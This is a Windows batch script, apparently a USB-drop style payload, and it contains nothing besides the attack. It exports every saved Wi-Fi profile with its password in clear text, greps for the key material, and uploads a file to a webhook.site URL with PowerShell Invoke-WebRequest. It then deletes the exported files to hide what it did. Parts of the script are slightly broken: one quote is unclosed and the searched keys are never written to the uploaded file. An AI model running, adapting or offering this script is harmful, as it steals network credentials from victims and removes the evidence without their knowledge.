@echo off
cd %temp%
netsh wlan export profile key=clear
powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial
powershell Invoke-WebRequest -Uri https://webhook.site/208bb110-5551-4170-897d-ea91d8015b18 -Method POST -InFile Wi-Fi-PASS
del Wi-* /s /f /q
exit
